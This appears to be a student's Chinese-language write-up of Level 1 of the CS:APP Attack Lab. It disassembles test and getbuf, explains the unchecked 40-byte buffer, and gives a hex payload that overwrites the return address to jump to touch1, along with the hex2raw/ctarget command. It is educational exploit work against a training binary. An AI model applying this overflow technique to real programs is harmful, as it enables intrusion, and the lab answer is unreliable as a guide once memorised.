# Attack Lab

## Part I: Code Injection Attacks

### Level 1
level 1 在 `test` 函式內，需要利用 `test` 內呼叫到的 `getbuf` 函式。
因為 `getbuf` 沒有作邊界檢查，可能造成 buffer overflow 的漏洞。
利用此處 buffer overflow 將 `getbuf` 的 return address 改寫成 `touch1` 函式的地址。

- test()
    ```
    (gdb) disass test
    Dump of assembler code for function test:
    0x0000000000401968 <+0>:	sub    $0x8,%rsp
    0x000000000040196c <+4>:	mov    $0x0,%eax
    0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
    0x0000000000401976 <+14>:	mov    %eax,%edx
    0x0000000000401978 <+16>:	mov    $0x403188,%esi
    0x000000000040197d <+21>:	mov    $0x1,%edi
    0x0000000000401982 <+26>:	mov    $0x0,%eax
    0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
    0x000000000040198c <+36>:	add    $0x8,%rsp
    0x0000000000401990 <+40>:	retq   
    End of assembler dump.
    ```

- getbuf()
    ```
    (gdb) disass getbuf
    Dump of assembler code for function getbuf:
    0x00000000004017a8 <+0>:	sub    $0x28,%rsp
    0x00000000004017ac <+4>:	mov    %rsp,%rdi
    0x00000000004017af <+7>:	callq  0x401a40 <Gets>
    0x00000000004017b4 <+12>:	mov    $0x1,%eax
    0x00000000004017b9 <+17>:	add    $0x28,%rsp
    0x00000000004017bd <+21>:	retq   
    End of assembler dump.
    ```

觀察進入 `getbuf` 時開出的 buffer 空間為 `0x28` (40byte)。
在輸入字串時在 40 byte 以後的內容以 little-endian 的順序寫入 `touch1` 的地址 (0x00000000004017c0)

- ctarget.l1.txt
    ```
    36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 c0 17 40 00 00 00 00 00
    ```

前 40Byte 為任意字串，後面加上 "c0 17 40 00 00 00 00 00" (`touch1` 的地址 - little-endian)

```
./hex2raw < ctarget.l1.txt | ./ctarget -q
```

在 `getbuf` 結束，成功跳轉到 `touch1`
